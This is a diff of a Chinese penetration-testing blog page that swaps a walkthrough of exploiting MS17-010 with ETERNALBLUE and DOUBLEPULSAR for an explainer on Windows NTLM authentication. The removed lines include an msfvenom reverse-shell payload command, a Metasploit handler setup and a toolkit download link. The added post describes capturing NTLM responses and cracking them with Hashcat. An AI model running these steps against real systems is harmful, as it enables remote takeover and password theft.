@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          MS17_010py脚本利用 - Kat | Blog
+          windows本地认证和NTML认证 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2020/11d3b845db.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2021/0466d81e0e.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#Redteam" title="Redteam">Redteam</a>
+                              <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
                             
                         </div>
-                        <h1>MS17_010py脚本利用</h1>
+                        <h1>windows本地认证和NTML认证</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2020-11-19
+                            2021-04-11
                         </span>
                     </div>
                 
@@ -215,47 +215,29 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h3 id="ms17_010py脚本利用">MS17_010py脚本利用</h3>
-<p>为什么要介绍使用py脚本？</p>
-<p>因为有些机器存在漏洞，但是MSF模块利用失败，而使用py脚本可以成功利用。</p>
-<h4 id="安装环境">安装环境</h4>
-<blockquote>
-<p>运行python环境的系统必须为32位，需要下载安装扩展文件。</p>
-<p>Windows x86 python-2.6.6.msi：<br>
-<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6.6/</a><br>
-pywin32-221.win32-py2.6.exe：<br>
-<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build 221/</a><br>
-方程式ETERNALBLUE 下载地址：<br>
-<a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="noopener">https://codeload.github.com/misterch0c/shadowbroker/zip/master</a></p>
-</blockquote>
-<h4 id="环境简介">环境简介</h4>
-<blockquote>
-<p>靶机：192.168.1.103（Win7-64）</p>
-<p>操作机：192.168.1.101 （MAC）</p>
-<p>操作机：192.168.1.104（Win7-32）</p>
-</blockquote>
-<h4 id="利用">利用</h4>
-<p>1、生成payload</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f dll &gt;64.dll</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwbm3sd6j30s905f76d.jpg" alt="image-20201119232432736"></p>
-<p>2、本地msf进行监听</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuweb222cj30mt076q5c.jpg" alt="image-20201119232708013"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 192.168.1.101</span><br><span class="line">set lport 1234</span><br></pre></td></tr></table></figure>
-<p>3、新建listeningposts文件夹并将msf生成的dll文件放入根目录，运行fb.py文件</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuv2prpxwj30k20qp77x.jpg" alt="image-20201119224124041"></p>
-<p>设置攻击相关信息</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw2bsuqij30i30esmze.jpg" alt="image-20201119231537200"></p>
-<p>Use Eternalblue 使用Eternalblue插件</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw4xvfdkj30pv0qkdiy.jpg" alt="image-20201119231807745"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw6jxu2wj30qo0c1wg3.jpg" alt="image-20201119231941181"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvl9ygttj30nv0ifq5v.jpg" alt="image-20201119225913910"></p>
-<p>接下来使用doublepulsar插件</p>
-<p>Use doublepulsar</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvpcxyb4j30oe0qtdiy.jpg" alt="image-20201119230309957"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvsaaynnj30lp0rhadk.jpg" alt="image-20201119230558825"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvu5s99kj30mr0kwtbd.jpg" alt="image-20201119230746276"></p>
-<p>这个时候返回msf，成功收到会话。</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwitxzy4j30nq09x41b.jpg" alt="image-20201119233129340"></p>
+                <h1 id="windows本地认证和ntml认证">Windows本地认证和NTML认证</h1>
+<p>在介绍windwos本地认证和NTML认证之前先介绍一下NTML哈希算法。</p>
+<p>NTML哈希算法是微软在windows2000之后推出的新密码管理方式，wiindows机器都是用NTML哈希算法加密用户的密码，密码保存在%SystemRoot%\System32\config\SAM 文件中。</p>
+<p>通常在渗透测试中可从 Windows 系统中的 SAM 文件 和 域控的 NTDS.dit 文件中获得所有用户的 Hash。</p>
+<p>NTLM 适用范围非常广，既可用于域内的认证服务， 也可用于没有域的工作组环境。NTLM 有 <strong>NTLMv1</strong> 、<strong>NTLMv2</strong> 、<strong>NTLMsession v2</strong> 三个版本，目前使用最多的是 NTLMv2 版本。</p>
+<p>在windows认证体系中主要有俩种认证体系，一个是NTML认证体系一个是Kerberos认证体系。</p>
+<h2 id="1-windows本地认证">1. Windows本地认证</h2>
+<p>Windows本地用户在登录的时候会将用户输入的密码是用NTML哈希进行加密，将加密后的哈希与本地SAM文件中的哈希值进行比对，比对成功后即可登录。</p>
+<p>当用户注销、重启、锁屏后，操作系统会让 winlogon 显示登录界面，也就是输入框。当 winlogon.exe 接收输入后，将密码交给 lsass 进程，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对 SAM 数据库比较认证。</p>
+<h2 id="2-ntml认证方式工作组环境">2. NTML认证方式（工作组环境）</h2>
+<p>在非域环境下，一般都是使用 NTLM 进行认证。SMB 服务和很多 Web 程序都是使用 NTLM 来实现对用户的身份认证。</p>
+<p>NTML工作组环境认证流程：</p>
+<p><img src="Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%92%8CNTML%E8%AE%A4%E8%AF%81/image-20210411220516233.png" alt="image-20210411220516233"></p>
+<p><img src="Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%92%8CNTML%E8%AE%A4%E8%AF%81/image-20210411223928119.png" alt="image-20210411223928119"></p>
+<p><img src="Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%92%8CNTML%E8%AE%A4%E8%AF%81/image-20210411223832988.png" alt="image-20210411223832988"></p>
+<p>由于客户端在连接文件服务器时，默认会将当前登录用户的密码Hash发送至服务器进行验证，在这个过程中就给攻击者提供了破解NTML hash的机会。</p>
+<p>如果获得了内网一个文件服务器的权限，那么内网中的其他主机在使用界面尝试访问该服务器时，首先会将本机的密码Hash发送至服务器进行验证，在服务器端抓取数据包能够获得NTLM Response，对NTLM Response的格式进行解析，提取特定信息，使用Hashcat尝试字典破解或者暴力破解，就有可能还原出用户本机的明文口令。</p>
+<p>也就是说我们如果可以抓取数据包，也就有可能获取其他用户的账号密码。</p>
+<p>参考链接：<a href="https://blog.csdn.net/sinolover/article/details/103971084" target="_blank" rel="noopener">https://blog.csdn.net/sinolover/article/details/103971084</a></p>
+<h2 id="3-ntml认证方式域环境中">3. NTML认证方式（域环境中）</h2>
+<p>在域环境中优先使用Kerberos认证方式，当Kerberos认证不可用的时候才会使用NTML认证方式。</p>
+<p>NTML域环境中的认证流程：</p>
+<p><img src="Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%92%8CNTML%E8%AE%A4%E8%AF%81/image-20210411221042111.png" alt="image-20210411221042111"></p>
 
                 
 
@@ -263,10 +245,10 @@ pywin32-221.win32-py2.6.exe：<br>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2020/112273054a.html" data-toggle="tooltip" data-placement="top" title="使用drozer框架测试安卓组件">&larr; Previous Post</a>
-                        </li>
                     
+                        <li class="next">
+                            <a href="/2021/043e4e3078.html" data-toggle="tooltip" data-placement="top" title="LDAP协议">Next Post &rarr;</a>
+                        </li>
                     
                 </ul>
 
@@ -321,7 +303,7 @@ pywin32-221.win32-py2.6.exe：<br>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ms17_010py脚本利用"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MS17_010py&#x811A;&#x672C;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#安装环境"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x5B89;&#x88C5;&#x73AF;&#x5883;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#环境简介"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x73AF;&#x5883;&#x7B80;&#x4ECB;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#利用"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">&#x5229;&#x7528;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#windows本地认证和ntml认证"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Windows&#x672C;&#x5730;&#x8BA4;&#x8BC1;&#x548C;NTML&#x8BA4;&#x8BC1;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-windows本地认证"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">1. Windows&#x672C;&#x5730;&#x8BA4;&#x8BC1;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-ntml认证方式工作组环境"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">2. NTML&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#xFF08;&#x5DE5;&#x4F5C;&#x7EC4;&#x73AF;&#x5883;&#xFF09;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-ntml认证方式域环境中"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">3. NTML&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#xFF08;&#x57DF;&#x73AF;&#x5883;&#x4E2D;&#xFF09;</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -341,7 +323,7 @@ pywin32-221.win32-py2.6.exe：<br>
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#Redteam" title="Redteam">Redteam</a>
+                          <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
                         
                     </div>
                 </section>
